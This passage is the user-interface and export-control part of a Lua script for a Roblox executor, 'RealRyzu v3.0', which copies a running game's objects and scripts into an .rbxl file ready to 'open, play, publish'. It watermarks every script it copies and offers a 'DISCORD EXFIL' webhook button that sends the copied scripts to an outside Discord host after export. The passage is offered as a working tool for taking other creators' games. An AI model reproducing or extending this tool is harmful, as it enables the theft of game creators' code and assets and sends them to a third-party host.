CloseBtn.Size = UDim2.new(0, 36, 0, 36)
CloseBtn.Position = UDim2.new(1, -40, 0, 5)
CloseBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 36)
CloseBtn.TextColor3 = Color3.fromRGB(255, 120, 120)
CloseBtn.Font = Enum.Font.Code
CloseBtn.TextSize = 22
CloseBtn.BorderSizePixel = 0
CloseBtn.Parent = TitleBar
CloseBtn.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)

-- Content area
local Content = Instance.new("Frame")
Content.Size = UDim2.new(1, -20, 0, 295)
Content.Position = UDim2.new(0, 10, 0, 52)
Content.BackgroundTransparency = 1
Content.BorderSizePixel = 0
Content.Parent = Main

-- Status box
local StatusBox = Instance.new("Frame")
StatusBox.Size = UDim2.new(1, 0, 0, 60)
StatusBox.Position = UDim2.new(0, 0, 0, 0)
StatusBox.BackgroundColor3 = Color3.fromRGB(8, 8, 16)
StatusBox.BorderSizePixel = 0
StatusBox.Parent = Content

local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size = UDim2.new(1, -12, 0, 18)
StatusLabel.Position = UDim2.new(0, 6, 0, 6)
StatusLabel.BackgroundTransparency = 1
StatusLabel.TextColor3 = Color3.fromRGB(0, 230, 165)
StatusLabel.Font = Enum.Font.Code
StatusLabel.TextSize = 12
StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
StatusLabel.Text = "STATUS: Ready — awaiting export command"
StatusLabel.Parent = StatusBox

local DetailLabel = Instance.new("TextLabel")
DetailLabel.Size = UDim2.new(1, -12, 0, 16)
DetailLabel.Position = UDim2.new(0, 6, 0, 28)
DetailLabel.BackgroundTransparency = 1
DetailLabel.TextColor3 = Color3.fromRGB(130, 130, 155)
DetailLabel.Font = Enum.Font.Code
DetailLabel.TextSize = 9
DetailLabel.TextXAlignment = Enum.TextXAlignment.Left
DetailLabel.Text = "Output: Clean .rbxl file | Deep watermark | Ready to publish"
DetailLabel.Parent = StatusBox

local ProgressLabel = Instance.new("TextLabel")
ProgressLabel.Size = UDim2.new(1, -12, 0, 14)
ProgressLabel.Position = UDim2.new(0, 6, 0, 44)
ProgressLabel.BackgroundTransparency = 1
ProgressLabel.TextColor3 = Color3.fromRGB(100, 100, 125)
ProgressLabel.Font = Enum.Font.Code
ProgressLabel.TextSize = 8
ProgressLabel.TextXAlignment = Enum.TextXAlignment.Left
ProgressLabel.TextTruncate = Enum.TextTruncate.AtEnd
ProgressLabel.Text = "..."
ProgressLabel.Parent = StatusBox

-- Big percentage
local BigPct = Instance.new("TextLabel")
BigPct.Size = UDim2.new(1, 0, 0, 52)
BigPct.Position = UDim2.new(0, 0, 0, 66)
BigPct.BackgroundTransparency = 1
BigPct.TextColor3 = Color3.fromRGB(0, 255, 180)
BigPct.Font = Enum.Font.Code
BigPct.TextSize = 44
BigPct.Text = "0.0%"
BigPct.TextXAlignment = Enum.TextXAlignment.Center
BigPct.Parent = Content

-- Progress bar
local BarBg = Instance.new("Frame")
BarBg.Size = UDim2.new(1, 0, 0, 18)
BarBg.Position = UDim2.new(0, 0, 0, 122)
BarBg.BackgroundColor3 = Color3.fromRGB(12, 12, 22)
BarBg.BorderSizePixel = 0
BarBg.Parent = Content

local BarFill = Instance.new("Frame")
BarFill.Size = UDim2.new(0, 0, 1, 0)
BarFill.BackgroundColor3 = Color3.fromRGB(0, 195, 250)
BarFill.BorderSizePixel = 0
BarFill.Parent = BarBg

local BarEdge = Instance.new("Frame")
BarEdge.Size = UDim2.new(0, 4, 1, 0)
BarEdge.Position = UDim2.new(1, -4, 0, 0)
BarEdge.BackgroundColor3 = Color3.fromRGB(140, 230, 255)
BarEdge.BorderSizePixel = 0
BarEdge.BackgroundTransparency = 0.35
BarEdge.Parent = BarFill

-- Stats
local StatsText = Instance.new("TextLabel")
StatsText.Size = UDim2.new(1, 0, 0, 18)
StatsText.Position = UDim2.new(0, 0, 0, 144)
StatsText.BackgroundTransparency = 1
StatsText.TextColor3 = Color3.fromRGB(170, 170, 195)
StatsText.Font = Enum.Font.Code
StatsText.TextSize = 9
StatsText.Text = "Objects: 0/0 | Scripts: 0 | Failed: 0 | ETA: --:--"
StatsText.TextXAlignment = Enum.TextXAlignment.Center
StatsText.Parent = Content

local FileStats = Instance.new("TextLabel")
FileStats.Size = UDim2.new(1, 0, 0, 16)
FileStats.Position = UDim2.new(0, 0, 0, 164)
FileStats.BackgroundTransparency = 1
FileStats.TextColor3 = Color3.fromRGB(110, 220, 110)
FileStats.Font = Enum.Font.Code
FileStats.TextSize = 9
FileStats.Text = "💾 Local backup: 0 files | 0 KB"
FileStats.TextXAlignment = Enum.TextXAlignment.Center
FileStats.Parent = Content

-- Options
local OptionsFrame = Instance.new("Frame")
OptionsFrame.Size = UDim2.new(1, 0, 0, 24)
OptionsFrame.Position = UDim2.new(0, 0, 0, 186)
OptionsFrame.BackgroundTransparency = 1
OptionsFrame.BorderSizePixel = 0
OptionsFrame.Parent = Content

local DeepWMBtn = Instance.new("TextButton")
DeepWMBtn.Size = UDim2.new(0, 200, 0, 22)
DeepWMBtn.Position = UDim2.new(0, 0, 0, 0)
DeepWMBtn.BackgroundColor3 = Color3.fromRGB(0, 130, 70)
DeepWMBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
DeepWMBtn.Font = Enum.Font.Code
DeepWMBtn.TextSize = 9
DeepWMBtn.Text = "✓ DEEP WATERMARK (bottom)"
DeepWMBtn.BorderSizePixel = 0
DeepWMBtn.Parent = OptionsFrame
DeepWMBtn.MouseButton1Click:Connect(function()
    CONFIG.DeepWatermark = not CONFIG.DeepWatermark
    if CONFIG.DeepWatermark then
        DeepWMBtn.BackgroundColor3 = Color3.fromRGB(0, 130, 70)
        DeepWMBtn.Text = "✓ DEEP WATERMARK (bottom)"
    else
        DeepWMBtn.BackgroundColor3 = Color3.fromRGB(60, 22, 22)
        DeepWMBtn.Text = "✗ DEEP WATERMARK (top)"
    end
end)

local BackupToggle = Instance.new("TextButton")
BackupToggle.Size = UDim2.new(0, 200, 0, 22)
BackupToggle.Position = UDim2.new(0, 210, 0, 0)
BackupToggle.BackgroundColor3 = Color3.fromRGB(0, 130, 70)
BackupToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
BackupToggle.Font = Enum.Font.Code
BackupToggle.TextSize = 9
BackupToggle.Text = "✓ LOCAL BACKUP"
BackupToggle.BorderSizePixel = 0
BackupToggle.Parent = OptionsFrame
BackupToggle.MouseButton1Click:Connect(function()
    CONFIG.ExportLocalCopy = not CONFIG.ExportLocalCopy
    if CONFIG.ExportLocalCopy then
        BackupToggle.BackgroundColor3 = Color3.fromRGB(0, 130, 70)
        BackupToggle.Text = "✓ LOCAL BACKUP"
    else
        BackupToggle.BackgroundColor3 = Color3.fromRGB(60, 22, 22)
        BackupToggle.Text = "✗ LOCAL BACKUP"
    end
end)

local RestoreToggle = Instance.new("TextButton")
RestoreToggle.Size = UDim2.new(0, 200, 0, 22)
RestoreToggle.Position = UDim2.new(0, 420, 0, 0)
RestoreToggle.BackgroundColor3 = Color3.fromRGB(0, 130, 70)
RestoreToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
RestoreToggle.Font = Enum.Font.Code
RestoreToggle.TextSize = 9
RestoreToggle.Text = "✓ RESTORE ORIGINAL"
RestoreToggle.BorderSizePixel = 0
RestoreToggle.Parent = OptionsFrame
RestoreToggle.MouseButton1Click:Connect(function()
    CONFIG.PreserveOriginal = not CONFIG.PreserveOriginal
    if CONFIG.PreserveOriginal then
        RestoreToggle.BackgroundColor3 = Color3.fromRGB(0, 130, 70)
        RestoreToggle.Text = "✓ RESTORE ORIGINAL"
    else
        RestoreToggle.BackgroundColor3 = Color3.fromRGB(60, 22, 22)
        RestoreToggle.Text = "✗ RESTORE ORIGINAL"
    end
end)

-- Buttons
local ExportBtn = Instance.new("TextButton")
ExportBtn.Size = UDim2.new(0, 220, 0, 36)
ExportBtn.Position = UDim2.new(0, 0, 0, 216)
ExportBtn.BackgroundColor3 = Color3.fromRGB(0, 155, 240)
ExportBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ExportBtn.Font = Enum.Font.Code
ExportBtn.TextSize = 13
ExportBtn.Text = "🔴 EXPORT RBXL FILE"
ExportBtn.BorderSizePixel = 0
ExportBtn.Parent = Content

local SaveOnlyBtn = Instance.new("TextButton")
SaveOnlyBtn.Size = UDim2.new(0, 200, 0, 36)
SaveOnlyBtn.Position = UDim2.new(0, 230, 0, 216)
SaveOnlyBtn.BackgroundColor3 = Color3.fromRGB(0, 80, 150)
SaveOnlyBtn.TextColor3 = Color3.fromRGB(185, 240, 200)
SaveOnlyBtn.Font = Enum.Font.Code
SaveOnlyBtn.TextSize = 11
SaveOnlyBtn.Text = "💾 SAVE SCRIPTS ONLY"
SaveOnlyBtn.BorderSizePixel = 0
SaveOnlyBtn.Parent = Content

local ExfilBtn = Instance.new("TextButton")
ExfilBtn.Size = UDim2.new(0, 170, 0, 36)
ExfilBtn.Position = UDim2.new(0, 440, 0, 216)
ExfilBtn.BackgroundColor3 = Color3.fromRGB(180, 100, 20)
ExfilBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ExfilBtn.Font = Enum.Font.Code
ExfilBtn.TextSize = 11
ExfilBtn.Text = "📤 DISCORD EXFIL"
ExfilBtn.BorderSizePixel = 0
ExfilBtn.Parent = Content

-- Webhook input (hidden by default)
local WebhookInput = Instance.new("TextBox")
WebhookInput.Size = UDim2.new(1, 0, 0, 24)
WebhookInput.Position = UDim2.new(0, 0, 0, 258)
WebhookInput.BackgroundColor3 = Color3.fromRGB(14, 14, 26)
WebhookInput.TextColor3 = Color3.fromRGB(200, 200, 225)
WebhookInput.Font = Enum.Font.Code
WebhookInput.TextSize = 8
WebhookInput.PlaceholderText = "Discord webhook URL (optional)..."
WebhookInput.PlaceholderColor3 = Color3.fromRGB(75, 75, 105)
WebhookInput.Text = ""
WebhookInput.BorderSizePixel = 0
WebhookInput.Visible = false
WebhookInput.Parent = Content

-- Log area
local LogFrame = Instance.new("Frame")
LogFrame.Size = UDim2.new(1, -20, 0, 70)
LogFrame.Position = UDim2.new(0, 10, 0, 352)
LogFrame.BackgroundColor3 = Color3.fromRGB(4, 4, 10)
LogFrame.BorderSizePixel = 0
LogFrame.Parent = Main

local LogScroll = Instance.new("ScrollingFrame")
LogScroll.Size = UDim2.new(1, -6, 1, -6)
LogScroll.Position = UDim2.new(0, 3, 0, 3)
LogScroll.BackgroundTransparency = 1
LogScroll.BorderSizePixel = 0
LogScroll.ScrollBarThickness = 3
LogScroll.ScrollBarImageColor3 = Color3.fromRGB(0, 160, 230)
LogScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
LogScroll.Parent = LogFrame

local LogText = Instance.new("TextLabel")
LogText.Size = UDim2.new(1, -4, 0, 14)
LogText.Position = UDim2.new(0, 2, 0, 0)
LogText.BackgroundTransparency = 1
LogText.TextColor3 = Color3.fromRGB(150, 255, 165)
LogText.Font = Enum.Font.Code
LogText.TextSize = 9
LogText.TextXAlignment = Enum.TextXAlignment.Left
LogText.TextYAlignment = Enum.TextYAlignment.Top
LogText.TextWrapped = true
LogText.Text = ""
LogText.Parent = LogScroll

-- Bottom bar
local BottomBar = Instance.new("Frame")
BottomBar.Size = UDim2.new(1, 0, 0, 22)
BottomBar.Position = UDim2.new(0, 0, 1, -22)
BottomBar.BackgroundColor3 = Color3.fromRGB(6, 6, 14)
BottomBar.BorderSizePixel = 0
BottomBar.Parent = Main

local RuntimeDisplay = Instance.new("TextLabel")
RuntimeDisplay.Size = UDim2.new(0, 300, 1, 0)
RuntimeDisplay.Position = UDim2.new(0, 8, 0, 0)
RuntimeDisplay.BackgroundTransparency = 1
RuntimeDisplay.TextColor3 = Color3.fromRGB(110, 220, 110)
RuntimeDisplay.Font = Enum.Font.Code
RuntimeDisplay.TextSize = 9
RuntimeDisplay.Text = "Runtime: 0s | Files: 0 | Size: 0 KB"
RuntimeDisplay.TextXAlignment = Enum.TextXAlignment.Left
RuntimeDisplay.Parent = BottomBar

local ModeDisplay = Instance.new("TextLabel")
ModeDisplay.Size = UDim2.new(0, 250, 1, 0)
ModeDisplay.Position = UDim2.new(1, -258, 0, 0)
ModeDisplay.BackgroundTransparency = 1
ModeDisplay.TextColor3 = Color3.fromRGB(110, 195, 235)
ModeDisplay.Font = Enum.Font.Code
ModeDisplay.TextSize = 9
ModeDisplay.Text = "Output: Clean .rbxl file"
ModeDisplay.TextXAlignment = Enum.TextXAlignment.Right
ModeDisplay.Parent = BottomBar

-- ============================================================
-- LOGGING
-- ============================================================
local logBuf = {}
local function Log(msg, color)
    color = color or Color3.fromRGB(150, 255, 165)
    local entry = "[" .. os.date("%H:%M:%S") .. "] " .. msg
    table.insert(logBuf, {text=entry, col=color})
    if #logBuf > 60 then table.remove(logBuf, 1) end
    local lines = {}
    local s = math.max(1, #logBuf - 22)
    for i = s, #logBuf do table.insert(lines, logBuf[i].text) end
    LogText.Text = table.concat(lines, "\n")
    LogText.Size = UDim2.new(1, -4, 0, math.max(LogText.TextBounds.Y, 14))
    LogScroll.CanvasSize = UDim2.new(0, 0, 0, LogText.TextBounds.Y + 6)
    task.wait()
    LogScroll.CanvasPosition = Vector2.new(0, LogScroll.CanvasSize.Y.Offset)
end

-- ============================================================
-- UI UPDATE
-- ============================================================
local function UpdateUI(pct, obj, total, scripts, failed)
    pct = math.min(pct or 0, 100)
    BigPct.Text = string.format("%.1f%%", pct)
    BarFill.Size = UDim2.new(pct/100, 0, 1, 0)
    
    local r = 0; local g = 255-(60*pct/100); local b = 180-(140*pct/100)
    BigPct.TextColor3 = Color3.fromRGB(r/255, math.max(g,0)/255, math.max(b,0)/255)
    
    StatsText.Text = string.format("Objects: %d/%d | Scripts: %d | Failed: %d",
        obj or 0, total or 0, scripts or 0, failed or 0)
    
    FileStats.Text = string.format("💾 Local backup: %d files | %.1f KB",
        VirtualFS.TotalCount, VirtualFS.TotalSize/1024)
    
    RuntimeDisplay.Text = string.format("Runtime: %.1fs | Files: %d | Size: %.1f KB",
        tick() - (exportStartTime or tick()), VirtualFS.TotalCount, VirtualFS.TotalSize/1024)
end

-- ============================================================
-- MAIN EXPORT LOGIC
-- ============================================================
local exportStartTime = 0
local isExporting = false

local function RunExport(dumpOnly)
    if isExporting then
        Log("Export already in progress!", Color3.fromRGB(255, 200, 55))
        return
    end
    
    isExporting = true
    exportStartTime = tick()
    
    -- Reset virtual FS
    VirtualFS.Files = {}
    VirtualFS.TotalCount = 0
    VirtualFS.TotalSize = 0
    
    local totalObjects = 0
    local clonedObjects = 0
    local taggedScripts = 0
    local failedObjects = 0
    
    -- Count all objects
    local function countAll(parent)
        local c = 0
        for _, child in ipairs(parent:GetChildren()) do
            if InstanceCloner:CanClone(child) then
                c = c + 1 + countAll(child)
            end
        end
        return c
    end
    
    for _, target in ipairs(EXPORT_TARGETS) do
        totalObjects = totalObjects + countAll(target.Source)
    end
    
    Log(string.rep("═", 50), Color3.fromRGB(0, 200, 255))
    Log("  REALRYZU v3.0 — RBXL EXPORT STARTED", Color3.fromRGB(0, 240, 255))
    Log("  Mode: " .. (dumpOnly and "SCRIPTS ONLY" or "FULL RBXL"), Color3.fromRGB(170, 220, 240))
    Log("  Objects: " .. totalObjects, Color3.fromRGB(150, 255, 150))
    Log("  Watermark: " .. (CONFIG.WatermarkEnabled and "DEEP (bottom of scripts)" or "DISABLED"), Color3.fromRGB(150, 255, 150))
    Log("  Output: Clean .rbxl file", Color3.fromRGB(150, 255, 150))
    Log(string.rep("═", 50), Color3.fromRGB(0, 200, 255))
    
    StatusLabel.Text = "STATUS: Backing up original content..."
    StatusLabel.TextColor3 = Color3.fromRGB(225, 210, 55)
    ExportBtn.Text = "🔄 EXPORTING..."
    ExportBtn.BackgroundColor3 = Color3.fromRGB(0, 80, 140)
    
    -- Backup original content
    if CONFIG.PreserveOriginal then
        ContentBackup:Store(EXPORT_TARGETS)
        Log("Original content backed up", Color3.fromRGB(150, 255, 150))
    end
    
    -- Clear services
    StatusLabel.Text = "STATUS: Preparing services..."
    ContentBackup:ClearServices(EXPORT_TARGETS)
    Log("Services cleared for rebuild", Color3.fromRGB(200, 200, 150))
    
    -- Clone content directly into real services
    StatusLabel.Text = "STATUS: Rebuilding game structure..."
    StatusLabel.TextColor3 = Color3.fromRGB(0, 225, 165)
    
    for _, target in ipairs(EXPORT_TARGETS) do
        Log("Processing: " .. target.Name, Color3.fromRGB(160, 170, 215))
        DetailLabel.Text = "Current: " .. target.Name
        
        for _, child in ipairs(target.Source:GetChildren()) do
            if not InstanceCloner:CanClone(child) then
                clonedObjects = clonedObjects + 1
            else
                local vfs = CONFIG.ExportLocalCopy and VirtualFS or nil
                local success = pcall(function()
                    InstanceCloner:DeepClone(child, target.Dest or target.Source, vfs, target.Name)
                end)
                
                if success then
                    taggedScripts = taggedScripts + 1
                else
                    failedObjects = failedObjects + 1
                end
                clonedObjects = clonedObjects + 1
            end
            
            if clonedObjects % 30 == 0 then
                task.wait()
                UpdateUI(
                    totalObjects > 0 and (clonedObjects/totalObjects)*100 or 0,
                    clonedObjects, totalObjects, taggedScripts, failedObjects
                )
            end
        end
    end
    
    UpdateUI(100, clonedObjects, totalObjects, taggedScripts, failedObjects)
    
    -- Save the rbxl file
    if not dumpOnly then
        StatusLabel.Text = "STATUS: Writing .rbxl file..."
        StatusLabel.TextColor3 = Color3.fromRGB(0, 225, 165)
        
        local filename = CONFIG.SavePath
        local success, savedPath = SaveManager:SaveToFile(filename)
        
        if success then
            Log("✅ RBXL file saved: " .. savedPath, Color3.fromRGB(150, 255, 150))
            Log("   File is clean — content in correct services", Color3.fromRGB(150, 255, 150))
            Log("   Watermark embedded deep in all scripts", Color3.fromRGB(150, 255, 150))
            Log("   Ready to open in Studio, play, publish", Color3.fromRGB(150, 255, 150))
            StatusLabel.Text = "STATUS: Complete ✓ — RBXL saved to " .. savedPath
            StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 150)
        else
            Log("⚠ SaveInstance not available — trying alternatives...", Color3.fromRGB(255, 200, 55))
            
            -- Try alternative: script extraction only
            if CONFIG.ExportLocalCopy then
                local manifest = VirtualFS:GetManifest()
                pcall(function() setclipboard(manifest) end)
                Log("   Scripts saved to clipboard instead", Color3.fromRGB(255, 220, 100))
                Log("   Use the manifest to rebuild manually", Color3.fromRGB(255, 220, 100))
            end
            
            StatusLabel.Text = "STATUS: Scripts saved (saveinstance unavailable)"
            StatusLabel.TextColor3 = Color3.fromRGB(255, 200, 55)
        end
    else
        -- Dump only
        if CONFIG.ExportLocalCopy then
            local manifest = VirtualFS:GetManifest()
            pcall(function() setclipboard(manifest) end)
            Log("Scripts saved to clipboard", Color3.fromRGB(150, 255, 150))
        end
        StatusLabel.Text = "STATUS: Script dump complete"
        StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 150)
    end
    
    -- Restore original content
    if CONFIG.PreserveOriginal then
        StatusLabel.Text = "STATUS: Restoring original game..."
        ContentBackup:Restore()
        Log("Original game content restored", Color3.fromRGB(150, 255, 150))
        Log("Your game is back to normal", Color3.fromRGB(150, 255, 150))
    end
    
    local elapsed = tick() - exportStartTime
    Log(string.rep("═", 50), Color3.fromRGB(0, 200, 255))
    Log("  EXPORT COMPLETE — " .. string.format("%.1fs", elapsed), Color3.fromRGB(0, 240, 255))
    Log("  Objects: " .. clonedObjects, Color3.fromRGB(150, 255, 150))
    Log("  Scripts tagged: " .. taggedScripts, Color3.fromRGB(150, 255, 150))
    Log("  Files backed up: " .. VirtualFS.TotalCount, Color3.fromRGB(150, 255, 150))
    Log(string.rep("═", 50), Color3.fromRGB(0, 200, 255))
    
    isExporting = false
    ExportBtn.Text = "🔴 EXPORT RBXL FILE"
    ExportBtn.BackgroundColor3 = Color3.fromRGB(0, 155, 240)
end

-- ============================================================
-- BUTTON HANDLERS
-- ============================================================
ExportBtn.MouseButton1Click:Connect(function()
    task.spawn(function() RunExport(false) end)
end)

SaveOnlyBtn.MouseButton1Click:Connect(function()
    task.spawn(function() RunExport(true) end)
end)

ExfilBtn.MouseButton1Click:Connect(function()
    WebhookInput.Visible = not WebhookInput.Visible
    if WebhookInput.Visible then
        WebhookInput:CaptureFocus()
    end
end)

WebhookInput.FocusLost:Connect(function(enterPressed)
    if enterPressed and WebhookInput.Text ~= "" then
        if DiscordExfil:Set(WebhookInput.Text) then
            Log("Webhook set! Scripts will be exfiltrated after export.", Color3.fromRGB(150, 255, 150))
            WebhookInput.Visible = false
        else
            Log("Invalid webhook URL", Color3.fromRGB(255, 120, 120))
        end
    end
end)

-- ============================================================
-- INITIALIZATION
-- ============================================================
local execName, execScore = DetectExecutor()
ExecText.Text = "Executor: " .. execName

pcall(function()
    local info = MarketplaceService:GetProductInfo(game.PlaceId)
    if info and info.Name then GameText.Text = "Game: " .. info.Name end
end)

Log("RealRyzu v3.0 loaded — CLIENT-READY RBXL EXPORTER", Color3.fromRGB(0, 245, 255))
Log("Executor: " .. execName, Color3.fromRGB(110, 220, 110))
Log("Produces clean .rbxl — open, play, publish", Color3.fromRGB(110, 230, 110))
Log("Watermark: Deep embedded (not visible to players)", Color3.fromRGB(110, 230, 110))
Log("discord.gg/realryzu", Color3.fromRGB(0, 205, 250))
Log("Ready — press EXPORT RBXL FILE", Color3.fromRGB(150, 255, 150))

-- Delete key to close
UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == Enum.KeyCode.Delete and not isExporting then
        ScreenGui:Destroy()
    end
end)
